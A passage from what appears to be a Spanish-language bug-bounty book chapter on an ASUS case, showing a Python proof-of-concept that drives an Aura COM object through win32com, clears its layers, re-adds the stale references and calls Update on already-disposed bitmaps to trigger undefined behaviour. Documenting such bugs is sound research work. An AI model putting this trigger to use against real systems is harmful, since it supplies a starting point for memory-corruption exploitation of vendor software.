# Extraído de: LibroBugBounty/cap-22-caso-asus.md
anim = win32com.client.Dispatch(CLSID_AURA)
anim.init(10, 10)

# Crear y anadir 5 layers
layers = [anim.CreateLayer() for _ in range(5)]
for layer in layers:
    anim.AddLayer(layer)

# ClearLayers: libera recursos internos
anim.ClearLayers()

# Re-anadir referencias stale: TODAS aceptadas
for layer in layers:
    anim.AddLayer(layer)  # Stale reference aceptada

# Operar con layers stale -> comportamiento indefinido
anim.Update()  # Opera sobre Bitmaps ya dispuestos
